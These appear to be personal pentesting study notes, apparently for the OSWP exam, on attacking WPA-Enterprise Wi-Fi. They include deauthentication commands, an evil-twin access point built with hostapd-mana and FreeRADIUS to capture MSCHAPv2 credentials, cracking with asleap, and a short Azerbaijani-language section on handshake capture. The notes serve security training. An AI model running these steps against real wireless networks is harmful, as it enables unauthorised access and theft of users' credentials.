

https://notes.incendium.rocks/pentesting-notes/wireless-networks/wpa-enterpise-wpa-mgt


This manual is not very good. I suggest consulting my OSWP exam report as I attacked an WPA MGT network there and documented it nicely.

### Step 1: Activate monitoring mode

```bash
airmon-ng check kill && airmon-ng start <interface>
```

### Step 2: Check AUTH column

```bash
airodump-ng <interface>
```
*Note: The AUTH column will say MGT.*

### Step 3: Capture the handshake

```bash
sudo airodump-ng -c channel -w ESSID interface
```

### Step 4: Deauthenticate the client to capture the handshake

```bash
aireplay-ng -0 0 -a ESSID -c client_ESSID interface
```

### Step 5: Analyze with Wireshark or tshark

After gathering the BSSID, ESSID, and channel:

- Use Wireshark or tshark with filters:
  ```bash
  wlan.bssid==E8:9C:12:02:66:AA && eap && tls.handshake.certificate
  ```
  or
  ```bash
  tls.handshake.type == 11,3
  ```

### Step 6: Save certificates using OpenSSL

View the Packet Details in TLSv1 Record Layer >> Handshake Protocol >> Certificate:
Handshake Protocol: Certificate item -> Certificates -> Certificate -> Export Packet Bytes save to file ca.der and server.der
```bash
openssl x509 -inform der -in cert.der -text
```

*Details needed for the attack include: Issuer information.*

### Step 7: Set up FreeRADIUS server

Install with:

```bash
sudo apt install freeradius
```

Edit the ca and server field in `ca.cnf` and `server.cnf` files respectively

```bash
sudo mousepad /etc/freeradius/3.0/certs/ca.cnf
sudo mousepad /etc/freeradius/3.0/certs/server.cnf
```


### Step 8: Prepare the certificates

Navigate to `/etc/freeradius/3.0/certs/` and run:

```bash
sudo rm dh && make
```

*Note: Ignore the error from FreeRADIUS if it expects other configurations.*

### Step 9: Configure hostapd-mana

Edit `/etc/hostapd-mana/hostapd-mana.conf` with the correct SSID, Certificate paths, and EAP file.

### Step 10: Set up `mana.eap_user`

Configure `/etc/hostapd-mana/mana.eap_user` with the desired protocols and authentication methods. Like such:
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

### Step 11: Start hostapd-mana

```bash
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
```

### Step 12: Use asleap to find a user

Run asleap with the correct command to find a user with a successful login.

```bash
asleap -C Challenge -R Response -W /usr/share/wordlists/rockyou.txt
```

### Step 13: Create `wpa_supplicant.conf` file

Add the network configuration details:

```bash
network={
  ssid="NetworkName"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Domain\username"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
```

### Step 14: Connect to the network

Use `wpa_supplicant` to connect:

```bash
wpa_supplicant -c <config file>
```




Ilk once hedefi mueyyen eliyirik

![Screenshot 2023-05-02 004539](https://user-images.githubusercontent.com/90620429/235608982-51778c63-dfc8-4b09-a059-29b0e9747831.png)

Indi ise dump-a kecirib pcap faylini goturek

```
sudo airdump-ng -c 2 -w Playtronics wlan0mon
```

Client-le elaqeni kesib, paketi goturek

```
sudo aireplay-ng -0 1 -a "AP address" -c "cliend address" wlan0mon
```

![image](https://user-images.githubusercontent.com/90620429/235652333-24ab48cc-9948-4e12-8726-ec149f71e5a5.png)

![image](https://user-images.githubusercontent.com/90620429/235652729-495f1987-76fc-4f60-8a1a-da3de30e35c4.png)

goturdukden sonra ssh ile ozumuze oturek

scp remoteuser@remoteserver:/remote/folder/remotefile.txt  localfile.txt

wireshark ile aciriq

![image](https://user-images.githubusercontent.com/90620429/235652791-a26b6172-2662-49c3-9bd4-4f8533703b68.png)


![image](https://user-images.githubusercontent.com/90620429/235652831-0c15e822-1072-44eb-a0b0-e1a7191bdd44.png)


![image](https://user-images.githubusercontent.com/90620429/235652968-e9d8c195-5a35-4cb8-bd83-bf5fa1e1dfd8.png)


![image](https://user-images.githubusercontent.com/90620429/235653013-f5eadc9d-111c-4eff-b81f-84bc0a6ac028.png)


![image](https://user-images.githubusercontent.com/90620429/235653067-65fedda8-af73-4b3b-8937-1d3c00794692.png)


![image](https://user-images.githubusercontent.com/90620429/235653131-636ac7bc-8695-4cae-8837-c69340977a1c.png)


![image](https://user-images.githubusercontent.com/90620429/235653213-521f7247-a524-48b1-adeb-4fd7320d8cd8.png)


![image](https://user-images.githubusercontent.com/90620429/235653289-865d2d9e-ba38-4458-ab3a-fbe22a358bd3.png)


![image](https://github.com/al1z4deh/OSWP/assets/90620429/5d8fd05f-7bb8-4c74-8b6b-bbfe87d328b3)




![image](https://user-images.githubusercontent.com/90620429/235653399-ec84426b-dc36-4995-972e-72bd42b0f795.png)

![image](https://user-images.githubusercontent.com/90620429/235653428-26d174a9-2568-4d16-b7f9-fca3c7cad029.png)

![image](https://user-images.githubusercontent.com/90620429/235653570-77f336c2-4ebe-4cac-8384-dd9ce4a12366.png)


![image](https://user-images.githubusercontent.com/90620429/235653640-34d0a093-86a2-434f-8d23-201b63afdcf3.png)

![image](https://user-images.githubusercontent.com/90620429/235653700-2a748c7d-9ef5-4e31-ae18-d653b8b2f8d9.png)


onnan sonra biraz gozle yada airplay at tezeden qosulsun

![image](https://user-images.githubusercontent.com/90620429/235653788-d56246b1-4a8f-4398-92ac-3197f313f431.png)


![image](https://user-images.githubusercontent.com/90620429/235653841-2e1b0c5f-70d3-47bb-9e20-a4f74485c14b.png)


ref: https://portal.offsec.com/courses/pen-210/books-and-videos/modal/video/attacking-wpa-enterprise/attack/attack


https://vimeo.com/192497350
